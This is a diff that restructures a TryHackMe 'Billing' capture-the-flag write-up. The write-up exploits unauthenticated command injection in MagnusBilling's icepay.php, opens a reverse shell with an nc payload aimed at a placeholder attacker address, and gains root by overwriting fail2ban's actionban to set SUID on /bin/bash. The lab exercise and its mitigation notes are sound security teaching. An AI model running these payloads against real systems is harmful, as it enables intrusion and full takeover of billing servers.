@@ -1,228 +1,304 @@
-<table>
-  <tr>
-    <td>
-      <img src="./images/billingimage.png" width="250">
-    </td>
-    <td width="900">
-      <h1>Billing — Write-up</h1>
-      <p>Some mistakes can be costly.</p>
-      <p><strong>Difficulty:</strong> Easy 🟢</p>
-      <img src="https://img.shields.io/badge/Platform-TryHackMe-blue?style=flat-square"> &nbsp;
-      <img src="https://img.shields.io/badge/Level-Easy-green?style=flat-square"> &nbsp;
-      <img src="https://img.shields.io/badge/Category-Web-green?style=flat-square">
-    </td>
-  </tr>
-</table>
+---
+title: "Billing — Write-up (TryHackMe)"
+room: "https://tryhackme.com/room/billing"
+difficulty: "Easy"
+platform: "TryHackMe"
+category: "Web"
+---
 
-https://tryhackme.com/room/billing
+# Billing — Write-up
+
+> **Summary:** exploit an **unauthenticated Command Injection** in **MagnusBilling 6.0.0.0** to obtain a shell as `asterisk`, then perform **Privilege Escalation** via `sudo` access to `fail2ban-client` to gain root.
 
 ---
 
-Gain a shell, find the way and escalate your privileges!<br>
+## Executive summary
 
-1. What is user.txt?
+- **Initial access:** Unauthenticated command injection in `icepay.php` (`GET democ=`)
+- **Access obtained:** shell as `asterisk`
+- **Privilege escalation:** `sudo` NOPASSWD for `/usr/bin/fail2ban-client` → overwrite `actionban` → trigger via `banip`
+- **Evidence:** blind timing validation + reverse shell + `sudo -l` + Fail2Ban server executing actions as root
+- **Flags:** `user.txt` and `root.txt` (redacted)
 
-2. What is root.txt?
-
-> Note: Bruteforcing is out of scope for this room.
-
-## 🕵 Phase 1: Reconnaissance
-
-
-#### Nmap Scanning
-The engagement began with a comprehensive Nmap scan to identify open ports and services running on the target host:
-
-```bash
-└─$ nmap -n -Pn -T4 -p- -sV -sC 10.66.186.106
-Not shown: 65531 closed tcp ports (reset)
-PORT     STATE SERVICE  VERSION
-22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
-| ssh-hostkey: 
-|   256 93:dd:45:55:81:ea:48:a5:82:d0:a0:6c:e3:2b:b6:2a (ECDSA)
-|_  256 f2:cd:6b:4e:da:f2:ec:39:18:87:3e:5d:98:3c:93:cf (ED25519)
-80/tcp   open  http     Apache httpd 2.4.62 ((Debian))
-|_http-server-header: Apache/2.4.62 (Debian)
-| http-robots.txt: 1 disallowed entry 
-|_/mbilling/
-| http-title:             MagnusBilling        
-|_Requested resource was http://10.66.186.106/mbilling/
-3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)
-5038/tcp open  asterisk Asterisk Call Manager 2.10.6
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-```
-#### What are we looking at?
-Essentially, this server is a complete telephony hub. It’s an "all-in-one" system designed to manage VoIP calls and billing from a single place.<br>
-We have Asterisk doing the heavy lifting for the phone services behind the scenes, MagnusBilling acting as the front-end for administrators to manage accounts and credits, and a MariaDB database holding everything together in the background. It’s a well-updated Debian machine, likely serving as the backbone for a communication provider's operations.
+> **OPSEC note:** IP addresses and flags are masked/redacted for publication.
 
 ---
-Let's visit the homepage through the browser and see what's there.<br>
-The system automatically redirects to the MagnusBilling application, though no specific version is displayed.
 
-<img src="./images/initial_page.png" alt="index page" width="1200" height="400">
+## Attack path (quick view)
 
-**Source Code Analysis:** Bootstrapping Process
-"To begin the reconnaissance, I analyzed the initial HTML source code to identify how the application initializes its environment. I pinpointed the 'Microloader' script, which serves as the entry point for the ExtJS framework and is responsible for loading the application's configuration and metadata into memory."
+1. **Recon:** Nmap identifies `80/tcp` hosting `MagnusBilling` at `/mbilling/`
+2. **Enum / Versioning:** browser console metadata confirms `MBilling 6.0.0.0`
+3. **Exploit:** command injection at `/mbilling/lib/icepay/icepay.php?democ=...` (blind) → reverse shell
+4. **Privesc:** `sudo -l` → `fail2ban-client` NOPASSWD → modify `actionban` → `banip` executes as root → SUID `/bin/bash` → root
+
+---
+
+## Scope and assumptions
+
+- **Bruteforcing:** out of scope (per room note).
+- **Goal:** obtain `user.txt` and `root.txt`.
+- **Target host:** `TARGET_IP` (e.g., `10.66.x.x`)
+- **Attacker host:** `ATTACKER_IP` (e.g., `192.168.x.x`)
+
+---
+
+# Phase 1 — Reconnaissance
+
+## Nmap scanning
 
 ```bash
- </script>
-        <script data-app="66fb43d2-c53a-4317-ab77-8188ac019a5b" id="microloader" type="text/javascript">
-            var Ext=Ext||{};Ext.manifest=Ext.manifest||"blue-neptune.json";Ext=Ext||{};....
+nmap -n -Pn -T4 -p- -sV -sC TARGET_IP
 ```
 
-After identifying the microloader script and the Ext.manifest reference in the static source code, I decided to verify how these components were being interpreted in real-time. Let's take a look at what the browser tells us about that. > By switching to the developer console and querying the live object, I was able to confirm the application's metadata directly from memory.
+**Findings (high level):**
 
-#### Revealed the app version >>> name: "MBilling", version: "6.0.0.0"
+- `22/tcp` — OpenSSH (Debian)
+- `80/tcp` — Apache (redirects to `/mbilling/`)
+- `3306/tcp` — MariaDB (unauthorized)
+- `5038/tcp` — Asterisk Call Manager
 
-<img src="./images/consoleLog.png" alt="Console.log" width="1200">
+This host behaves like a VoIP/telephony hub: **Asterisk** as the backend, **MagnusBilling** as the admin/front-end, and **MariaDB** as storage.
 
-#### Searching for known vulnerabilities.
+---
+
+## Accessing MagnusBilling and version enumeration
+
+Browsing to `http://TARGET_IP/` redirects to:
+
+- `http://TARGET_IP/mbilling/`
+
+Inspecting the HTML revealed the **ExtJS** bootstrap via a microloader:
+
+```html
+<script data-app="66fb43d2-c53a-4317-ab77-8188ac019a5b" id="microloader" type="text/javascript">
+  var Ext=Ext||{};Ext.manifest=Ext.manifest||"blue-neptune.json";Ext=Ext||{};....
+</script>
+```
+
+The application version was then confirmed in real time from the browser console by reading the metadata loaded in memory:
+
+- **name:** `MBilling`
+- **version:** `6.0.0.0`
+
+---
+
+# Phase 2 — Exploitation (Initial Access)
+
+## Vulnerability: unauthenticated command injection in `icepay.php`
+
+**High-level description:**  
+A **command injection** issue in vulnerable **MagnusBilling 6.x/7.x** instances allows arbitrary command execution via an **unauthenticated** HTTP request by controlling the `democ` parameter at:
+
+- `/mbilling/lib/icepay/icepay.php?democ=...`
+
+The file contains demonstration logic that invokes `exec()` with user-controlled input **without proper sanitization/escaping**. Commands execute with the privileges of the web process (commonly `www-data`; on this host it is `asterisk`).
+
+> **Mitigation:** remove/disable the demo endpoint, restrict access to `/mbilling/` (ACL/VPN), and update to a patched version (vendor fix/commit).
+
+---
+
+## Endpoint validation
+
+First, verify the file exists and responds:
+
+```bash
+curl -I "http://TARGET_IP/mbilling/lib/icepay/icepay.php?democ=echo%20test"
+```
+
+This confirms `HTTP 200`. Because the response does not reflect command output, I validated execution using a **blind timing** technique.
+
+### Proof (blind): sleep
+
+```bash
+time curl -s "http://TARGET_IP/mbilling/lib/icepay/icepay.php?democ=;sleep+5;"
+```
+
+A consistent ~5 second delay confirms server-side execution.
+
+**Payload notes:**
+- `;` separates shell commands
+- `time` measures response duration to confirm execution
+- a trailing `;` helps prevent collisions with any server-side concatenation
+
+---
+
+## Reverse shell (RCE → shell as asterisk)
+
+On the attacker machine, start a listener:
+
+```bash
+nc -lvnp 443
+```
+
+Execute the payload (using `--data-urlencode` to safely encode special characters):
+
+```bash
+curl -s -G "http://TARGET_IP/mbilling/lib/icepay/icepay.php" \
+  --data-urlencode "democ=;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 443 >/tmp/f;"
+```
+
+> **Note:** If `443` is not suitable, use another port (e.g., `4444`) and update both the listener and payload accordingly.
+
+Upon connection:
 
 ```text
-Description
-A Command Injection vulnerability in MagnusBilling application 6.x and 7.x allows
-remote attackers to run arbitrary commands via unauthenticated HTTP request.
-A piece of demonstration code is present in `lib/icepay/icepay.php`, with a call to an exec().
-The parameter to exec() includes the GET parameter `democ`, which is controlled by the user and
-not properly sanitised/escaped.
-After successful exploitation, an unauthenticated user is able to execute arbitrary OS commands.
-The commands run with the privileges of the web server process, typically `www-data` or `asterisk`.
-At a minimum, this allows an attacker to compromise the billing system and its database.
-
-The following MagnusBilling applications are vulnerable:
-- MagnusBilling application version 6 (all versions);
-- MagnusBilling application up to version 7.x without commit 7af21ed620 which fixes this vulnerability;
-```
-
-### Proof of Concept: Endpoint Validation
-
-Here we can assume that the file exists but does not return a response, meaning it is blind.
-
-```bash
-└─$ curl http://10.66.186.106/mbilling/lib/icepay/icepay.php?democ=echo%20%22test%22 -I
-HTTP/1.1 200 OK
-Date: Sat, 03 Jan 2026 19:11:56 GMT
-Server: Apache/2.4.62 (Debian)
-Content-Type: text/html; charset=UTF-8
-```
-
-Let's use a sleep.
-
-```bash
-└─$ time curl -s 'http://10.66.186.106/mbilling/lib/icepay/icepay.php?democ=;sleep+5;'
-
-real    0m5,328s
-user    0m0,011s
-sys     0m0,005s
-```
-***Breaking down the payload***
-
-To make this work, I structured the command to do a few specific things:<br>
-Timing the response: I used the time command at the start to measure exactly how long the server takes to answer. This is my 'stopwatch'.<br>
-The Semicolon trick: By using semicolons (;), I'm telling the server: 'Stop whatever you’re doing and run my command next.' The quotes around the URL ensure my own terminal doesn't get confused by these special characters.<br>
-Safety net: I added a second semicolon at the very end to 'cancel out' any other code that might exist on the server's side, making sure my sleep command runs cleanly without errors.<br>
-> The result? A 5-second delay that proves the server is doing exactly what I tell it to do."
-
-#### Now ready to try a reverse shell.
-
-```bash
-└─$ curl -s -G 'http://10.66.186.106/mbilling/lib/icepay/icepay.php' --data-urlencode 'democ=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc  <attacker_ip> 443 > /tmp/f;'
-```
-
-```bash
-└─$ nc -lvnp 443
-listening on [any] 443 ...
-connect to [192.168.130.186] from (UNKNOWN) [10.66.186.106] 43828
 sh: 0: can't access tty; job control turned off
-$ 
+$
 ```
-#### searching for the user flag
+
+---
+
+## Shell stabilization (TTY)
 
 ```bash
-└─$ nc -lvnp 443
-listening on [any] 443 ...
-connect to [192.168.130.186] from (UNKNOWN) [10.66.186.106] 43828
-sh: 0: can't access tty; job control turned off
-$ python3 -c 'import pty;pty.spawn("/bin/bash")'
-asterisk@ip-10-66-186-106:/var/www/html/mbilling/lib/icepay$ export TERM=xterm
-<var/www/html/mbilling/lib/icepay$ export TERM=xterm         
-asterisk@ip-10-66-186-106:/var/www/html/mbilling/lib/icepay$ ^Z
-[1]+  Parado                     nc -lvnp 443
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+^Z
+stty raw -echo; fg
+```
 
-└─$ stty raw -echo; fg
-nc -lvnp 443
-                       
-asterisk@ip-10-66-186-106:/var/www/html/mbilling/lib/icepay$ cd /home/magnus
-asterisk@ip-10-66-186-106:/home/magnus$ cat user.txt
+---
+
+## User flag
+
+```bash
+cd /home/magnus
+cat user.txt
 THM{[redacted]}
 ```
----
----
-### Privilege escalation, looking for a root flag.
 
-We found something using suid, running as root.
+---
+
+# Phase 3 — Privilege Escalation
+
+## Privilege enumeration
+
+Current user:
 
 ```bash
-asterisk@ip-10-66-186-106:/$ id
-uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
-asterisk@ip-10-66-186-106:/$ sudo -l
-Matching Defaults entries for asterisk on ip-10-66-186-106:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
-
-Runas and Command-specific defaults for asterisk:
-    Defaults!/usr/bin/fail2ban-client !requiretty
-
-User asterisk may run the following commands on ip-10-66-186-106:
-    (ALL) NOPASSWD: /usr/bin/fail2ban-client
+id
 ```
-#### 🤔 😵‍💫 I’ll do some digging on fail2ban-client exploits.
 
-The fail2ban-client is the CLI used to manage and configure the fail2ban-server. This security tool protects the system by monitoring logs for malicious activity and automatically blocking offending IPs via firewall rules. Since the server process runs as root, any ability to control the client with elevated privileges (via sudo) creates a high-risk path for full system compromise.
+Check sudo permissions:
 
-### 👊👊 Attacking, using fail2ban to change the suid of /bin/bash
-
-The output confirms that the fail2ban-server is actively monitoring the system through 8 specific 'jails'. Each jail represents a set of rules and filters tailored to a particular service.
 ```bash
-asterisk@ip-10-66-186-106:/$ sudo fail2ban-client status
-Status
+sudo -l
+```
+
+**Critical finding:**
+- user `asterisk` can run **without a password**:
+  - `(ALL) NOPASSWD: /usr/bin/fail2ban-client`
+
+---
+
+## Why this matters
+
+`fail2ban-client` is a control client. It sends commands to the **fail2ban-server**, which typically runs as **root** to apply firewall rules and execute ban/unban actions.
+
+If we can modify an action command (e.g., `actionban`) and then **trigger** that action, the server will execute our supplied command as **root**.
+
+---
+
+## Fail2Ban abuse: overwrite `actionban` and trigger via `banip`
+
+### 1) List active jails
+
+```bash
+sudo fail2ban-client status
+```
+
+Example output:
+
+```text
 |- Number of jail:      8
 `- Jail list:   ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd
 ```
-I checked the asterisk-iptables jail and found its specific action: iptables-allports-ASTERISK.
+
+### 2) Identify actions for the `asterisk-iptables` jail
+
 ```bash
-asterisk@ip-10-66-186-106:/$ sudo fail2ban-client get asterisk-iptables actions
-The jail asterisk-iptables has the following actions:
+sudo fail2ban-client get asterisk-iptables actions
+```
+
+Expected (example):
+
+```text
 iptables-allports-ASTERISK
 ```
-The output shows the exact iptables syntax the server uses to ban an IP.
+
+### 3) Inspect the default `actionban` command
+
 ```bash
-asterisk@ip-10-66-186-106:/$ sudo fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
+sudo fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
+```
+
+Example:
+
+```text
 <iptables> -I f2b-ASTERISK 1 -s <ip> -j <blocktype>
 ```
 
- I replaced the standard firewall rule with a command that grants permanent root access: chmod +s /bin/bash.
+### 4) Replace `actionban` with an arbitrary command
 
- ```bash
- asterisk@ip-10-66-186-106:/$ sudo fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
-chmod +s /bin/bash
-```
-I needed to force the system to execute it. I used the banip command to manually ban a dummy IP address (1.2.3.4).
+Here, I replaced it with a command that enables SUID on `/bin/bash`:
 
 ```bash
-asterisk@ip-10-66-186-106:/$ sudo fail2ban-client set asterisk-iptables banip 1.2.3.4
-1
+sudo fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban "chmod +s /bin/bash"
 ```
-### triggering /bin/bash with suid and retrieving the root flag.
+
+### 5) Trigger execution via `banip`
 
 ```bash
-asterisk@ip-10-66-186-106:/$ /bin/bash -p
-bash-5.2# id
-uid=1001(asterisk) gid=1001(asterisk) euid=0(root) egid=0(root) groups=0(root),1001(asterisk)
-bash-5.2# cd /root
-bash-5.2# cat root.txt
+sudo fail2ban-client set asterisk-iptables banip 1.2.3.4
+```
+
+If successful, `fail2ban-server` executes the new `actionban` as root.
+
+---
+
+## Root shell via SUID bash
+
+```bash
+/bin/bash -p
+id
+```
+
+Expected:
+
+```text
+euid=0(root)
+```
+
+---
+
+## Root flag
+
+```bash
+cd /root
+cat root.txt
 THM{[redacted]}
-bash-5.2# 
 ```
-## 🤴🏿 Pnwed, by Nelson Hirt
 
+---
 
+## Cleanup (best practice)
+
+Because SUID on `/bin/bash` is persistent and unsafe, revert it:
+
+```bash
+chmod u-s /bin/bash
+```
+
+It is also recommended to restore the original Fail2Ban `actionban` (or reload the jail configuration) in controlled lab/test environments.
+
+---
+
+# Conclusion
+
+- **Impact:** full system compromise (root) starting from unauthenticated RCE in MagnusBilling.
+- **Attack chain:** vulnerable endpoint → shell as `asterisk` → `sudo` fail2ban-client → root execution via Fail2Ban server → root access.
+- **Key lessons:** demo endpoints and overly permissive `sudo` rules create short paths to total compromise.
+
+---
+
+> Written by **Nelson Hirt**
